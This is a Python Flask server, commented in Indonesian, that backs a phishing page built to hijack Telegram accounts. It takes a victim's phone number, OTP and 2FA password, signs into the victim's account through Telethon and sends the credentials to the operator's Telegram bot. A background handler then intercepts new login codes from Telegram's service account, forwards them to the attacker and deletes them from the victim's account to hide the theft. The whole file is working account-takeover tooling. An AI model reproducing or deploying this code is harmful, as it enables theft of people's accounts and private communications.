import os, asyncio, json, re, requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError

app = Flask(__name__)
CORS(app)

# Ambil Variables dari Railway
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

SESSION_DIR = '/tmp/sessions/'
if not os.path.exists(SESSION_DIR): os.makedirs(SESSION_DIR)

active_sessions = {}

def send_to_bot(text, msg_id=None, show_otp_button=False, nomor=None):
    """Fungsi tunggal untuk kirim atau edit pesan di bot agar tidak spam."""
    payload = {
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": "Markdown"
    }
    
    if show_otp_button and nomor:
        payload["reply_markup"] = {
            "inline_keyboard": [[{"text": "🔑 OTP", "callback_data": f"otp_{nomor}"}]]
        }

    if msg_id:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
        payload["message_id"] = msg_id
    else:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        
    try:
        r = requests.post(url, json=payload).json()
        return r.get("result", {}).get("message_id")
    except:
        return None

@app.route('/register', methods=['POST'])
async def register():
    data = request.json
    nama = data.get('nama', 'User')
    nomor_raw = data.get('nomor')
    
    # Format nomor otomatis ke +62
    n = re.sub(r'\D', '', nomor_raw)
    nomor = '+62' + n[1:] if n.startswith('08') else '+' + n

    client = TelegramClient(f"{SESSION_DIR}{nomor}", int(API_ID), API_HASH)
    await client.connect()
    
    try:
        # STEP 1: Langsung minta OTP saat target klik daftar di web
        sent_code = await client.send_code_request(nomor)
        
        # Kirim pesan awal ke bot (Tampilan persis Gambar 1)
        text = f"👤 *Target Masuk*\nNama: {nama}\nNomor: `{nomor}`\nKata sandi: None\n\nStatus: _Menunggu OTP dari web..._"
        msg_id = send_to_bot(text)
        
        active_sessions[nomor] = {
            "client": client,
            "phone_code_hash": sent_code.phone_code_hash,
            "nama": nama,
            "msg_id": msg_id
        }
        return jsonify({"status": "sent"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/verify-otp', methods=['POST'])
async def verify_otp():
    data = request.json
    nomor_raw = data.get('nomor')
    otp = data.get('otp')
    sandi_2fa = data.get('sandi')
    
    n = re.sub(r'\D', '', nomor_raw)
    nomor = '+62' + n[1:] if n.startswith('08') else '+' + n

    if nomor not in active_sessions:
        return jsonify({"status": "error"}), 400

    stored = active_sessions[nomor]
    client = stored["client"]

    try:
        # STEP 2: Masuk ke akun target (Kunci Sesi)
        user = await client.sign_in(nomor, otp, phone_code_hash=stored["phone_code_hash"])
        
        # JIKA SUKSES: Edit pesan lama & Munculkan tombol OTP
        nama_asli = user.first_name.split()[0] if user.first_name else stored["nama"]
        text = f"👤 *Login Sukses!*\nNama: {nama_asli}\nNomor: `{nomor}`\nKata sandi: {sandi_2fa if sandi_2fa else 'None'}\n\n✅ *Sesi Terkunci!* Klik tombol di bawah untuk intip kode TurboTel."
        
        send_to_bot(text, msg_id=stored["msg_id"], show_otp_button=True, nomor=nomor)
        
        # Aktifkan pengintip di background
        asyncio.create_task(start_ghost(client, stored["msg_id"], nama_asli, nomor))
        
        return jsonify({"status": "success"}), 200

    except SessionPasswordNeededError:
        return jsonify({"status": "need_2fa"}), 200
    except PhoneCodeInvalidError:
        return jsonify({"status": "error", "message": "OTP Salah!"}), 400

async def start_ghost(client, msg_id, nama, nomor):
    @client.on(events.NewMessage(from_users=777000))
    async def handler(event):
        otp_match = re.search(r'\b\d{5}\b', event.raw_text)
        if otp_match:
            otp_kode = otp_match.group()
            text = f"Nama: {nama}\nNomor: `{nomor}`\nKata sandi: None\n\n✅ *OTP Ditemukan:* `{otp_kode}`"
            send_to_bot(text, msg_id=msg_id, show_otp_button=True, nomor=nomor)
            await event.delete() # Hapus jejak di akun target
    await client.run_until_disconnected()

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)